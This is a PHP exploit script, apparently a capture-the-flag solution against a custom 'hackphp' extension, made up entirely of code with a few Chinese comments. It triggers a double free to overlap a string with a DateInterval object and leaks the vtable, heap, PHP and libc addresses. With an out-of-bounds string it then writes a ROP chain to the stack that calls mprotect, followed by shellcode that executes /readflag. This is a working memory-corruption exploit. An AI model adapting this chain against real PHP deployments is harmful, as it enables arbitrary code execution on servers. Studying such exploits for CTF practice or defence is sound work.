<?php
function u64($val) {
   $s = bin2hex($val);
   $len = strlen($s);
   $ans = "0x";
   for ($i=$len-2;$i>=0;$i-=2) {
      $ans = $ans . substr($s,$i,2);
   }
   return intval($ans,16);
}
function p32($val) {
   $s = dechex($val);
   $len = strlen($s);
   $ans = "";
   for ($i=$len-2;$i>=0;$i-=2) {
      $ans = $ans . substr($s,$i,2);
   }
   return hex2bin($ans);
}

//double free
hackphp_create(56);
hackphp_delete();

//$x and $dv now has same address
$x = str_repeat("D",0x18);
$dv = new DateInterval('P1Y');

$dv_vtable_addr = u64($x[0x10] . $x[0x11] . $x[0x12] . $x[0x13] . $x[0x14] . $x[0x15] . $x[0x16] . $x[0x17]);
echo sprintf("dv_vatble=0x%lx",$dv_vtable_addr);
echo  "\n";
$dv_self_obj_addr = u64($x[0x20] . $x[0x21] . $x[0x22] . $x[0x23] . $x[0x24] . $x[0x25] . $x[0x26] . $x[0x27]) - 0x70;
echo sprintf("dv_self_obj_addr=0x%lx",$dv_self_obj_addr);
echo "\n";

hackphp_create(0x60);
$oob = str_repeat("D",0x40);
hackphp_edit("\x01\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\xff\xff\xff\xff/readflag\x00");
$oob_self_obj_addr = u64($oob[0x48] . $oob[0x49] . $oob[0x4a] . $oob[0x4b] . $oob[0x4c] . $oob[0x4d] . $oob[0x4e] . $oob[0x4f]) - 0xC0;
echo sprintf("oob_self_obj_addr=0x%lx",$oob_self_obj_addr);
echo "\n";
$offset = $dv_vtable_addr + 0x8 - ($oob_self_obj_addr + 0x18);
function read64($oob,$addr) {
   /*if ($addr < 0) {
      $addr = 0x10000000000000000 + $addr;
   }*/
   return u64($oob[$addr+0x0] . $oob[$addr+0x1] . $oob[$addr+0x2] . $oob[$addr+0x3] . $oob[$addr+0x4] . $oob[$addr+0x5] . $oob[$addr+0x6] . $oob[$addr+0x7]);
}

echo sprintf("offset=0x%lx",$offset);
echo "\n";
$date_object_free_storage_interval_addr = read64($oob,$offset+1);
echo sprintf("date_object_free_storage_interval_addr=0x%lx",$date_object_free_storage_interval_addr);
echo "\n";

$php_base = $date_object_free_storage_interval_addr - 0x23D790;
$strlen_got = $php_base + 0xFFEEB8;

$offset = $strlen_got - ($oob_self_obj_addr + 0x18) + 1;
$strlen_addr = read64($oob,$offset);
$libc_base = $strlen_addr - 0x18b660;
$pop_rdi = $libc_base + 0x0000000000026b72;
$pop_rsi = $libc_base + 0x0000000000026b70;
$pop_rdx = $libc_base + 0x0000000000162866;

$stack_ptr = $libc_base + 0x1ec440;

$offset = $stack_ptr - ($oob_self_obj_addr + 0x18);
$stack_addr = read64($oob,$offset);
$mprotect_addr = $libc_base + 0x11BB00;

echo sprintf("strlen_addr=0x%lx \n",$strlen_addr);
echo sprintf("libc_base=0x%lx \n",$libc_base);
echo sprintf("stack_addr=0x%lx \n",$stack_addr);

$offset = $stack_addr - ($oob_self_obj_addr + 0x18);



$ret_main_target = $php_base + 0x51d402;
//搜索ROP的地址
while (true) {
   $data = read64($oob,$offset);
   //echo sprintf("0x%lx",$hackphp_so_addr & 0xFFF);
   //echo "\n";
   if (intval($data) == intval($ret_main_target) ) {
      echo "found!";
      break;
   }
   $offset--;
}


for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($pop_rsi & 0xFF);
   $pop_rsi = $pop_rsi >> 0x8;
}
$offset += 0x8;
$data = 0x1000;
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($data & 0xFF);
   $data = $data >> 0x8;
}

$offset += 0x10;
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($pop_rdx & 0xFF);
   $pop_rdx = $pop_rdx >> 0x8;
}
$offset += 0x8;
$data = 0x7;
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($data & 0xFF);
   $data = $data >> 0x8;
}
$offset += 0x10;

for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($pop_rdi & 0xFF);
   $pop_rdi = $pop_rdi >> 0x8;
}


$offset += 8;
$stack_addr = $offset + ($oob_self_obj_addr + 0x18);

$data = $stack_addr ^ ($stack_addr & 0xfff);
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($data & 0xFF);
   $data = $data >> 0x8;
}
$offset += 8;
$data = $mprotect_addr;
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($data & 0xFF);
   $data = $data >> 0x8;
}
$offset += 8;
$data = $stack_addr+0x18;
for ($j=0;$j<8;$j++) {
   $oob[$offset+$j] = chr($data & 0xFF);
   $data = $data >> 0x8;
}
$stack_addr += 0x18;
$offset += 0x8;

$shellcode = "\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\xB8\x2F\x72\x65\x61\x64\x66\x6C\x61\x48\x89\x45\xF0\x48\xC7\xC0\x67\x00\x00\x00\x48\x89\x45\xF8\x48\x8D\x7D\xF0\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\xB8\x3B\x00\x00\x00\x0F\x05";
$len = strlen($shellcode);

//写shellcode
for ($j=0;$j<$len;$j++) {
   $oob[$offset+$j] = $shellcode[$j];
}

?>